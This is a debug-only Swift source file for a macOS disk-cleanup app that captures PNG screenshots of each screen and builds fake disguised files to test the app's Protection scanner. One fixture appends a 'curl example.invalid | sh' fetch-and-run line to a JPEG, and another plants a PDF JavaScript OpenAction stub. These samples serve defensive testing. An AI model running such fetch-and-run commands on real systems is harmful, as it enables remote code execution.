// SPDX-License-Identifier: GPL-3.0-or-later

#if DEBUG
import AppKit
import SpaceroomCore
import SwiftUI

/// Debug-only UI tour: `SPACEROOM_SNAPSHOT_DIR=/some/dir` makes the app step through its main
/// screens and write a PNG of each. It only scans — it never cleans or changes files.
@MainActor
enum DebugSnapshots {
    static var directory: URL? {
        ProcessInfo.processInfo.environment["SPACEROOM_SNAPSHOT_DIR"].map { URL(fileURLWithPath: $0) }
    }

    static func runIfRequested(_ app: AppModel, menuBar: MenuBarModel) async {
        if let iconSet = ProcessInfo.processInfo.environment["SPACEROOM_EXPORT_ICON"] {
            exportAppIcon(to: URL(fileURLWithPath: iconSet))
            NSApp.terminate(nil)
            return
        }
        guard let directory else { return }
        try? FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)

        await captureMenuBar(app: app, menuBar: menuBar, in: directory)

        app.isShowingOnboarding = true
        await pause(1.2)
        capture("01-onboarding", in: directory, sheet: true)
        app.isShowingOnboarding = false

        for step in OnboardingView.Step.allCases {
            await captureTall(OnboardingView(initialStep: step).environment(app).environment(menuBar),
                              name: "01\(["a", "b", "c", "d", "e"][step.rawValue])-onboarding-\(step)", in: directory,
                              height: 620, width: 680)
        }

        app.selection = .smartCare
        await pause(1.2)
        capture("02a-smartcare-intro", in: directory)
        // Smart Care's Protection tile checks fake files, never the real Desktop.
        app.smartCareExtras.debugRoots = makeProtectionFixture(in: directory).map { [$0] }
        if let flow = app.flow(for: .smartCare) {
            flow.startScan()
            await pause(0.5)
            capture("02b-smartcare-scanning", in: directory)
            await waitUntil { flow.phase == .results }
            await pause(1.0)
            capture("02c-smartcare-results", in: directory)
        }

        app.selection = .cleanup
        await pause(1.2)
        capture("02-cleanup-intro", in: directory)

        if let flow = app.flow(for: .module(.cleanup)) {
            flow.startScan()
            await pause(0.4)
            capture("03-cleanup-scanning", in: directory)
            await waitUntil { flow.phase == .results }
            await pause(1.0)
            capture("04-cleanup-results", in: directory)
            flow.isReviewing = true
            await pause(1.0)
            capture("05-cleanup-review", in: directory)
            flow.isReviewing = false
        }

        app.selection = .devCleanup
        if let flow = app.flow(for: .module(.devCleanup)) {
            flow.startScan()
            await waitUntil { flow.phase == .results }
            await pause(1.0)
            capture("06-dev-results", in: directory)
        }

        app.selection = .restoreCenter
        await pause(1.0)
        capture("07-restore-center", in: directory)

        app.selection = .spaceLens
        await pause(1.0)
        capture("10-spacelens-intro", in: directory)
        let lens = app.spaceLens
        lens.selectedTargetID = "home"
        if let path = ProcessInfo.processInfo.environment["SPACEROOM_SNAPSHOT_LENS_PATH"] {
            lens.useDebugTarget(URL(fileURLWithPath: path))
        }
        lens.start()
        await waitUntil(timeout: 60) { lens.liveChildren.count >= 3 }
        await pause(1.0)
        capture("11-spacelens-scanning", in: directory)
        await waitUntil(timeout: 900) { lens.phase == .results }
        await pause(1.0)
        capture("12-spacelens-results", in: directory)
        if let biggest = lens.current?.children.first(where: { $0.kind == .folder && !$0.children.isEmpty }) {
            lens.drill(into: biggest)
            await pause(1.0)
            capture("13-spacelens-drilled", in: directory)
        }

        app.selection = .applications
        let apps = app.applications
        apps.loadIfNeeded()
        await waitUntil(timeout: 180) { apps.hasLoaded && !apps.rows.contains { $0.size == nil } }
        await pause(1.5)
        capture("15-applications", in: directory)
        apps.tab = .leftovers
        await pause(1.0)
        capture("16-applications-leftovers", in: directory)
        apps.tab = .installed

        app.selection = .clutter
        await pause(1.0)
        capture("17-clutter-intro", in: directory)
        let clutter = app.clutter
        clutter.start()
        await waitUntil(timeout: 600) { clutter.phase == .results && !clutter.isFindingDuplicates }
        await pause(1.0)
        capture("18-clutter-large", in: directory)
        clutter.tab = .duplicates
        await pause(1.0)
        capture("19-clutter-duplicates", in: directory)
        clutter.tab = .installers
        await pause(1.0)
        capture("20-clutter-installers", in: directory)
        clutter.tab = .large

        app.selection = .status
        await pause(8.0) // let gauges and process sampling fill in
        capture("21-status", in: directory)

        app.selection = .startup
        app.startup.loadIfNeeded()
        await waitUntil(timeout: 60) { app.startup.hasLoaded }
        await pause(1.0)
        capture("22-startup", in: directory)

        app.selection = .performance
        await pause(1.2)
        capture("23-performance", in: directory)

        app.selection = .privacy
        app.privacy.loadIfNeeded()
        await waitUntil(timeout: 60) { app.privacy.hasLoaded }
        await pause(1.2)
        capture("24-privacy", in: directory)
        await captureTall(PrivacyView(model: app.privacy).environment(app), name: "24b-privacy-full", in: directory)

        app.selection = .protection
        await pause(0.8)
        capture("27-protection-intro", in: directory)
        if let fixture = makeProtectionFixture(in: directory) {
            app.protection.debugRoots = [fixture]
            app.protection.startScan()
            await waitUntil(timeout: 60) { app.protection.phase == .results }
            await pause(1.2)
            capture("27b-protection-results", in: directory)
        }

        // Settings with a sample ignore list, in memory only.
        let realIgnoreList = app.ignoreList
        let home = FileManager.default.homeDirectoryForCurrentUser
        app.showIgnoreListForSnapshot(IgnoreList(entries: [
            .path(home.appendingPathComponent("development")), .path(home.appendingPathComponent("Downloads/Keep me.dmg")),
            .app("com.apple.dt.Xcode"), .rule("browser.chrome-cache")]))
        await captureTall(SettingsView().environment(app).environment(menuBar), name: "28-settings", in: directory,
                          height: 1400, width: 520)
        app.showIgnoreListForSnapshot(realIgnoreList)

        app.selection = .automations
        await waitUntil(timeout: 10) { app.automations.hasLoaded }
        await pause(1.2)
        capture("25-automations", in: directory)

        app.selection = .smartCare
        app.palette.open()
        await pause(1.0)
        capture("26-palette", in: directory)
        app.palette.query = "tra"
        await pause(0.6)
        capture("26b-palette-search", in: directory)
        app.palette.close()
        app.selection = .automations
        await pause(0.4)
        await captureTall(AutomationEditor(original: AutomationsModel.templates[1], isNew: true, retentionDays: app.retentionDays,
                                           onSave: { _ in }, onCancel: {}),
                          name: "25b-automation-editor", in: directory, height: 760, width: 500)

        NSApp.terminate(nil)
    }

    /// Renders the popover in an off-screen window and the status item images in both appearances.
    private static func captureMenuBar(app: AppModel, menuBar: MenuBarModel, in directory: URL) async {
        let host = NSHostingView(rootView: MenuBarPopover().environment(app).environment(menuBar))
        let window = NSWindow(contentRect: NSRect(x: -4000, y: 0, width: 340, height: 700),
                              styleMask: [.borderless], backing: .buffered, defer: false)
        window.contentView = host
        window.orderFrontRegardless()
        await waitUntil(timeout: 60) {
            !menuBar.actionStates.isEmpty && !menuBar.actionStates.values.contains(.measuring)
        }
        await pause(2.5) // let CPU/memory sparklines collect a few samples
        host.setFrameSize(host.fittingSize)
        window.setContentSize(host.fittingSize)
        if let rep = host.bitmapImageRepForCachingDisplay(in: host.bounds) {
            host.cacheDisplay(in: host.bounds, to: rep)
            try? rep.representation(using: .png, properties: [:])?
                .write(to: directory.appendingPathComponent("00-menubar-popover.png"))
        }
        window.orderOut(nil)

        // Confirmation sheet.
        let confirm = NSHostingView(rootView: ConfirmSheet(
            symbol: "trash", title: "Delete 676,9 MB permanently?",
            message: "These items leave the Restore Center for good and their space is freed right away.",
            details: [.init(symbol: "doc.on.doc", text: "48 items from Smart Care"),
                      .init(symbol: "calendar", text: "Cleaned 5 Nov 2026 at 12.04"),
                      .init(symbol: "exclamationmark.triangle", text: "This can't be undone")],
            confirmTitle: "Delete Permanently", onConfirm: {}, onCancel: {}))
        let confirmWindow = NSWindow(contentRect: NSRect(x: -4000, y: 0, width: 480, height: 520),
                                     styleMask: [.borderless], backing: .buffered, defer: false)
        confirmWindow.contentView = confirm
        confirmWindow.orderFrontRegardless()
        await pause(1.0)
        if let rep = confirm.bitmapImageRepForCachingDisplay(in: confirm.bounds) {
            confirm.cacheDisplay(in: confirm.bounds, to: rep)
            try? rep.representation(using: .png, properties: [:])?
                .write(to: directory.appendingPathComponent("14-confirm-sheet.png"))
        }
        confirmWindow.orderOut(nil)

        // Design tuning panel.
        let tuning = NSHostingView(rootView: DesignTuningPanel())
        let tuningWindow = NSWindow(contentRect: NSRect(x: -4000, y: 0, width: 380, height: 900),
                                    styleMask: [.titled], backing: .buffered, defer: false)
        tuningWindow.contentView = tuning
        tuningWindow.orderFrontRegardless()
        await pause(0.8)
        if let rep = tuning.bitmapImageRepForCachingDisplay(in: tuning.bounds) {
            tuning.cacheDisplay(in: tuning.bounds, to: rep)
            try? rep.representation(using: .png, properties: [:])?
                .write(to: directory.appendingPathComponent("09-design-tuning.png"))
        }
        tuningWindow.orderOut(nil)

        var images: [NSImage] = MenuBarModel.StorageStyle.allCases.map {
            StatusItemImage.storage(menuBar.rootVolume, style: $0)
        }
        images.append(StatusItemImage.cpu(menuBar.cpuUsage, history: menuBar.cpuHistory))
        images.append(StatusItemImage.memory(menuBar.memory))
        images.append(StatusItemImage.combined([StatusItemImage.storage(menuBar.rootVolume, style: .ringAndFree),
                                                StatusItemImage.cpu(menuBar.cpuUsage, history: menuBar.cpuHistory),
                                                StatusItemImage.memory(menuBar.memory)]))
        for (name, appearance) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
            writeStrip(images, appearance: NSAppearance(named: appearance)!,
                       to: directory.appendingPathComponent("00-menubar-items-\(name).png"))
        }
    }

    private static func writeStrip(_ images: [NSImage], appearance: NSAppearance, to url: URL) {
        let scale: CGFloat = 3
        let width = images.reduce(CGFloat(16)) { $0 + $1.size.width + 16 }
        let size = NSSize(width: width, height: 26)
        guard let rep = NSBitmapImageRep(bitmapDataPlanes: nil, pixelsWide: Int(size.width * scale),
                                         pixelsHigh: Int(size.height * scale), bitsPerSample: 8, samplesPerPixel: 4,
                                         hasAlpha: true, isPlanar: false, colorSpaceName: .deviceRGB,
                                         bytesPerRow: 0, bitsPerPixel: 0) else { return }
        rep.size = size
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = NSGraphicsContext(bitmapImageRep: rep)
        appearance.performAsCurrentDrawingAppearance {
            (appearance.name == .darkAqua ? NSColor(white: 0.15, alpha: 1) : NSColor(white: 0.93, alpha: 1)).setFill()
            NSRect(origin: .zero, size: size).fill()
            var x: CGFloat = 16
            for image in images {
                image.draw(in: NSRect(x: x, y: 4, width: image.size.width, height: image.size.height))
                x += image.size.width + 16
            }
        }
        NSGraphicsContext.restoreGraphicsState()
        try? rep.representation(using: .png, properties: [:])?.write(to: url)
    }

    /// Renders `AppIconArtwork` into every macOS icon size, overwriting the PNGs the
    /// AppIcon.appiconset's Contents.json already lists.
    private static func exportAppIcon(to iconSet: URL) {
        for base in [16, 32, 128, 256, 512] {
            for scale in [1, 2] {
                let pixels = base * scale
                let factor = CGFloat(pixels) / AppIconArtwork.canvas
                let renderer = ImageRenderer(content: AppIconArtwork().environment(\.colorScheme, .dark))
                renderer.scale = factor
                renderer.isOpaque = false
                guard let glyph = renderer.cgImage,
                      let context = CGContext(data: nil, width: pixels, height: pixels, bitsPerComponent: 8,
                                              bytesPerRow: 0, space: CGColorSpace(name: CGColorSpace.sRGB)!,
                                              bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)
                else { continue }
                let inset = (AppIconArtwork.canvas - AppIconArtwork.bodySize) / 2 * factor
                let side = AppIconArtwork.bodySize * factor
                // Small sizes get a tighter shadow so the edge stays crisp.
                let blur = max(1, 24 * factor), drop = max(0.5, 10 * factor)
                context.setShadow(offset: CGSize(width: 0, height: -drop), blur: blur,
                                  color: CGColor(srgbRed: 0.08, green: 0.03, blue: 0.2, alpha: 0.45))
                context.interpolationQuality = .high
                context.draw(glyph, in: CGRect(x: inset, y: inset + drop * 0.5, width: side, height: side))
                guard let output = context.makeImage() else { continue }
                let name = "icon_\(base)x\(base)\(scale == 2 ? "@2x" : "").png"
                try? NSBitmapImageRep(cgImage: output).representation(using: .png, properties: [:])?
                    .write(to: iconSet.appendingPathComponent(name))
            }
        }
    }

    /// Renders a scrolling screen in a tall offscreen window so the part below the fold can be checked too.
    private static func captureTall(_ view: some View, name: String, in directory: URL,
                                    height: CGFloat = 1900, width: CGFloat = 760) async {
        let host = NSHostingView(rootView: view.background(Color.hex(0x2B4A5C)).preferredColorScheme(.dark))
        let window = NSWindow(contentRect: NSRect(x: -4000, y: 0, width: width, height: height),
                              styleMask: [.borderless], backing: .buffered, defer: false)
        window.contentView = host
        window.orderFrontRegardless()
        await pause(1.2)
        if let rep = host.bitmapImageRepForCachingDisplay(in: host.bounds) {
            host.cacheDisplay(in: host.bounds, to: rep)
            try? rep.representation(using: .png, properties: [:])?.write(to: directory.appendingPathComponent("\(name).png"))
        }
        window.orderOut(nil)
    }

    /// Fake disguised files in the snapshot folder, so the Protection screen can be checked
    /// without reading (or prompting for) the real Desktop and Documents.
    private static func makeProtectionFixture(in directory: URL) -> URL? {
        let root = directory.appendingPathComponent("protection-fixture", isDirectory: true)
        let machO: [UInt8] = [0xCF, 0xFA, 0xED, 0xFE, 0x0C, 0x00, 0x00, 0x01] + Array(repeating: 0, count: 4096)
        let jpeg: [UInt8] = [0xFF, 0xD8, 0xFF, 0xE0] + Array(repeating: 0x11, count: 20_000) + [0xFF, 0xD9]
        let files: [(String, [UInt8])] = [
            ("Holiday photo.jpg", machO),
            ("Invoice March.pdf.command", Array("#!/bin/sh\necho hi\n".utf8)),
            ("Cat.jpg", jpeg + Array("#!/bin/sh\ncurl example.invalid | sh\n".utf8)),
            ("Form.pdf", Array("%PDF-1.7\n<< /OpenAction 2 0 R >>\n<< /S /JavaScript /JS (x) >>\n".utf8)),
            ("Free Movies.app/Contents/MacOS/Free Movies", machO),
            ("Real photo.jpg", jpeg),
        ]
        do {
            try? FileManager.default.removeItem(at: root)
            for (name, bytes) in files {
                let url = root.appendingPathComponent(name)
                try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
                try Data(bytes).write(to: url)
            }
            return root
        } catch {
            return nil
        }
    }

    private static func pause(_ seconds: Double) async {
        try? await Task.sleep(for: .seconds(seconds))
    }

    private static func waitUntil(timeout: Double = 120, _ condition: () -> Bool) async {
        let deadline = Date.now.addingTimeInterval(timeout)
        while !condition(), Date.now < deadline { await pause(0.25) }
    }

    private static func capture(_ name: String, in directory: URL, sheet: Bool = false) {
        guard let main = NSApp.windows.first(where: { $0.isVisible && $0.sheetParent == nil && $0.frame.width >= 900 })
        else { return }
        let window = sheet ? (main.attachedSheet ?? main) : main
        guard let view = window.contentView?.superview ?? window.contentView,
              let rep = view.bitmapImageRepForCachingDisplay(in: view.bounds) else { return }
        view.cacheDisplay(in: view.bounds, to: rep)
        try? rep.representation(using: .png, properties: [:])?
            .write(to: directory.appendingPathComponent("\(name).png"))
    }
}
#endif
